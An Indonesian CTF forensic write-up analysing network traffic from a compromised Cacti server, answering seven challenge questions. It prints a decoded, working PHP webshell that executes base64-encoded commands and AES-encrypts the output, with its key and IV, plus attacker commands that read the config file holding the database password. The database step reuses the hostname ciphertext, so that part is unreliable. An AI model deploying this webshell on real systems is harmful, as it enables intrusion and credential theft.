---
title: A Trail of Snow and Deception
date: 2025-12-22
category: Forensic
tags: [ctf, forensic, wireshark, network-analysis, cacti, webshell, php, encryption]
description: "Forensic Writeup: Analisis trafik jaringan pada Cacti Server yang disusupi."
---

## Deskripsi & Skenario

> Oliver Mirth, ahli forensik Tinselwick, berjongkok di dekat tiang lentera yang bersinar, menelusuri jejak debu berkilau dengan jari bersarung tangannya.
> Jejak itu mengarah ke tumpukan salju, lalu menghilang, tanpa jejak kaki,
> tanpa tanda-tanda perlawanan. Dia melirik ke atas ke arah Bola Salju yang berkedip-kedip di puncak Menara Sprucetop, cahayanya bergetar seperti bintang yang memudar.
> 'Seseorang telah mengutak-atik sihirnya,' gumam Oliver.
> 'Tapi kenapa?' Dia berdiri tegak, matanya menyipit. Jejaknya mungkin hilang,
> tetapi misterinya baru saja dimulai.
> Bisakah Oliver mengungkap rahasia di balik cahaya yang memudar?

Dalam challenge **University CTF 2025: Tinsel Trouble** kategori Forensic ini, kita diberikan file PCAP (capture.pcap) dan 7 pertanyaan. Tugas kita adalah membantu Oliver menganalisis jejak digital untuk menemukan siapa dan bagaimana sistem "Snowglobe" disusupi.


### Daftar Pertanyaan

> 1. Versi Cacti apa yang digunakan? (misal: 7.1.0)
> 2. Apa kredensial yang digunakan penyusup? (misal: username:password)
> 3. Tiga file PHP berbahaya terlibat dalam serangan ini. Berdasarkan urutan kemunculannya di aliran jaringan. Apa saja file tersebut ? (misal: file1.php, file2.php, file3.php)
> 4. File apa yang diunduh menggunakan curl selama proses eksploitasi? (misal: filename)
> 5. Apa nama variabel dalam salah satu dari tiga file PHP berbahaya yang menyimpan hasil perintah sistem yang dieksekusi? (misal: $q5ghsA)
> 6. Apa nama host mesin sistemnya? (misal: server01)
> 7. Apa kata sandi databse yang digunakan oleh Cacti? (misal: Password123)


## 1. Versi Cacti yang Digunakan

Karena Kita sudah diberi tahu nama aplikasi yang berjalan (Cacti), Saya memulai dengan mencari Packet Detail yang berisi string **Cacti**. Saya langsung menemukan packet 357 yang terindikasi berisi string **Cacti**.

![Packet 357](https://i.ibb.co.com/p6yHhk34/Screenshot-2025-12-22-170000.png)

Setelah itu Saya mencari versi **Cacti** dengan mengikuti HTTP Stream **Packet 357** tersebut.

![Version cacti](https://i.ibb.co.com/BHYwr7Vc/Screenshot-2025-12-22-170829.png)

**Jawaban 1:** **1.2.28**


## 2. Kredensial Login

Penyusup melakukan login ke dashboard (index.php). Dengan memfilter request POST ke `index.php`, Saya langsung menemukan 1 Packet berisi username dan password dengan mudah saat menganalisis Packet tersebut.

```
http.request.method == POST && http.request.uri contains "index.php"
```

**Jawaban 2:** **marnie.thistlewhip:Z4ZP_8QzKA**


## 3. Analisis Web Shell & Payload

> Berisi Jawaban 3-5

Setelah mendapatkan akses, penyusup tersebut mengunggah beberapa file PHP berbahaya (backdoor/webshell). Saya mencari file-file tersebut dengan memfilter request GET yang mengandung `.php`.

```
http.request.method == GET and http.request.uri contains ".php"
```

![Version cacti](https://i.ibb.co.com/8LkrKNjL/Screenshot-2025-12-22-180639.png)

Berdasarkan urutan waktu dalam stream jaringan, file-file tersebut adalah:

**Jawaban 3:** **JWuA5a1yj.php,ornf85gfQ.php,f54Avbg4.php**

### Eksekusi Perintah & Download File

Kemudian Penyusup menggunakan perintah `curl` untuk mengunduh binary eksternal ke server target. Disini Saya mencari manual Packet Detail yang berisi string **curl**.
Tapi untuk menghemat waktu, Saya sarankan menggunakan Wireshark Filter berikut:

```
http.request.method == GET and http.user_agent contains "curl"
```

Dan akan langsung muncul beberapa nama file yang setelah saya coba satu-satu ternyata yang benar yaitu **bash**.

**Jawaban 4:** **bash**

### Analisis Variabel PHP

Dalam file **bash** yang baru saja kita analisis tersebut terdapat variabel yang digunakan untuk menyimpan output dari fungsi eksekusi sistem (seperti `shell_exec`) namun di enkripsi dengan Base64.

![Version cacti](https://i.ibb.co.com/jkG1cwtX/Screenshot-2025-12-22-183647.png)

**Sebelum dekripsi:**
```
PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=
```

**Setelah dekripsi:**
```php
<?php 
$A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";
$A4gVaRmV = "pZ7qR1tLw8Df3XbK";
$A4gVaXzY = base64_decode($_GET["q"]);
$a54vag = shell_exec($A4gVaXzY);
$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);
echo base64_encode($A4gVaQdF); 
?>
```

Dari hasil dekripsi di atas, kita dapat melihat bahwa nama variabel yang menyimpan hasil eksekusi perintah sistem adalah **$a54vag**. Dan juga ada indikasi penggunaan enkripsi AES-256-CBC untuk mengamankan output tersebut.

## 4. Dekripsi Data Konfigurasi

Setelah mendapatkan akses ke web shell, penyusup mencoba untuk mengekstrak informasi sensitif dari server, seperti hostname sistem dan password database. Namun, informasi ini ditemukan dalam keadaan terenkripsi. Saya menggunakan informasi dari web shell sebelumnya untuk mendekripsi data ini.

Di saat mencari jawaban ke 3 tadi, ternyata payload di q= pada file terakhir (f54Avbg4.php) adalah sebuah perintah untuk mendapatkan hostname dan password database yang terenkripsi.

**Sebelum dekripsi:**
- /cacti/f54Avbg4.php?q=aWQ=
- /cacti/f54Avbg4.php?q=aG9zdG5hbWU=
- /cacti/f54Avbg4.php?q=cHdk
- /cacti/f54Avbg4.php?q=bHMgLWxh
- /cacti/f54Avbg4.php?q=bHMgLWxhIGluY2x1ZGU=
- /cacti/f54Avbg4.php?q=Y2F0IGluY2x1ZGUyZ29uZmlnLnBocA==

**Setelah dekripsi:**
- /cacti/f54Avbg4.php?q=id
- /cacti/f54Avbg4.php?q=hostname
- /cacti/f54Avbg4.php?q=pwd
- /cacti/f54Avbg4.php?q=ls -la
- /cacti/f54Avbg4.php?q=ls -la include
- /cacti/f54Avbg4.php?q=cat include/config.php

Hasil diatas memudahkan Saya untuk menemukan Packet Detail yang berisi output terenkripsi dari perintah `hostname` dan isi file `include/config.php` yang berisi password database.

### A. Temukan Hostname

Analisis Packet Detail dari perintah `hostname` menunjukkan bahwa hostname sistem disimpan dalam bentuk terenkripsi. Saya menggunakan kunci dan IV yang sama dari web shell untuk mendekripsi hostname tersebut dengan CyberChef.

**CyberChef Recipe (Hostname):**
```
KEY: kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G
IV: pZ7qR1tLw8Df3XbK
Input (Base64): HYjF7a38Od/H2Qc+uaBKuA==

Result: tinselmon01
```

**Jawaban 6:** **tinselmon01**

### B. Database Password

Selanjutnya, Saya menganalisis output terenkripsi dari file konfigurasi database yang ditemukan di `include/config.php`. Saya menggunakan metode dekripsi yang sama untuk mendapatkan password database.

**CyberChef Recipe (Konfigurasi DB):**
```
KEY: kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G
IV: pZ7qR1tLw8Df3XbK
Input (Base64): HYjF7a38Od/H2Qc+uaBKuA==

Result: (Berupa teks)
```

Setelah itu output akan berupa teks konfigurasi database yang telah didekripsi dan berisi password.

**Jawaban 7:** **zqvyh2fLgyhZp9KV**